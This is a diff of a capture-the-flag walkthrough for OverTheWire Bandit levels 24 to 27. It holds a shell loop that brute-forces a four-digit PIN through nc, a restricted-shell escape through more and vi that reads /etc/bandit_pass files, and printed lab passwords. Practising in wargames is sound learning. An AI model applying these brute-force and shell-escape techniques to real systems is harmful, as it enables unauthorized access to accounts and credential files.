@@ -454,53 +454,60 @@ vi brute.sh
 
 bandit24=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar                   
 
-for i in {0..9999}
+for i in {0000..9999}
     do
         echo $bandit24 $i >> list.txt
     done
+
 ```
 ```
 cat list.txt | nc localhost 30002
 ```
-`uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
+`p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`
 
 
 
 ## Level 25→ Level 26
 
 ```
-ssh -i ./bandit26.sshkey bandit26@localhost
+ssh -i ./bandit26.sshkey bandit26@localhost -p 2220
 ```
-
-/bin/bash X
-
+Shell not opens
 ```
 cat /etc/passwd | grep bandit26
 cat /usr/bin/showtext
 ```
-command: more  
-shell minimize
+```
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+```
+Execute command more and exits  
+Shell minimization
 
 ```
 v
 :e /etc/bandit_pass/bandit26
 ```
-`5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`
+`c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1`
 
 Set shell to /bin/bash
 
 ```
 :set shell=/bin/bash
+:shell
 ```
 
 
 ## Level 26→ Level 27
 
 ```
-:shell
 ./bandit27-do cat /etc/bandit_pass/bandit27
 ```
-`3ba3118a22e93127a4ed485be72ef5ea`
+`YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS`
 
 
 
